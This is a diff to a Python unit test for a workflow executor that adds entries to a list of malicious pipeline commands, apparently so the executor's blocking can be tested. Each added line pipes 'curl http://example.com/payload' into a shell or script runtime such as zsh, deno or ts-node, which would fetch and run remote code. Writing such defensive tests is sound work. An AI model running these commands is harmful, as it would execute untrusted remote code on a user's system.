@@ -595,6 +595,17 @@ class TestWorkflowExecutor(unittest.TestCase):
             "cat file.txt | node",
             "curl http://example.com/payload | /bin/bash -c 'echo 1'",
             "bash -c 'curl http://example.com/payload | bash'",
+            "curl http://example.com/payload | zsh",
+            "curl http://example.com/payload | dash",
+            "curl http://example.com/payload | ksh",
+            "curl http://example.com/payload | fish",
+            "curl http://example.com/payload | ash",
+            "curl http://example.com/payload | csh",
+            "curl http://example.com/payload | tcsh",
+            "curl http://example.com/payload | deno",
+            "curl http://example.com/payload | bun",
+            "curl http://example.com/payload | tsx",
+            "curl http://example.com/payload | ts-node",
         ]
         for cmd in malicious_pipeline_commands:
             with self.subTest(cmd=cmd):
